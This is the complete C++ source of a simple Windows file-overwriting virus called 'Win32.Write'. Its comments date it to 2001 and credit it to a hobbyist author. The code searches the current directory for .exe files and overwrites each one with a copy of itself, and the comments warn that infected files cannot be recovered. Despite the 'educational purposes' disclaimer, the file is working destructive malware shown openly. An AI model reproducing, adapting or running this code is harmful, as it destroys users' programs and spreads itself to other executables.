   //Win32.Write - My first simple Exe overwriting virus.
   //Coded by aLL3gRo <allegro16@hotmail.com>, 05 May 2001
   //Infects Exe files in current directory
   //Compiled on Borland C++ v5.02
   //WARNING !!! DO NOT RUN THE COMPILED EXECUTABLE. It'll destroy all Exe files in current directory.
   //All files infected by Win32.Write will be unrecoverable !!
   //Win32.Write is only for educational purposes only. DO NOT RELEASE.

   #include <windows.h>
   #include <stdlib.h>

   WIN32_FIND_DATA victim;
   HANDLE victhandle;
   char fname[512];
   bool infect=TRUE;

   int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lcmdLine,int nCmdShow)
   {
     //Get own file name
     GetModuleFileName(hInst,fname,512);

     //Find for first victim
     victhandle=FindFirstFile("*.exe",&victim);
     if(victhandle==INVALID_HANDLE_VALUE) {
       //If no exe files in current directory, terminate
       exit(0);
     }

     //Infect Exe files, Loop through each Exe file in current directory
     while(infect) {
       CopyFile(fname,victim.cFileName,FALSE);
       infect=FindNextFile(victhandle,&victim);
     }

   }
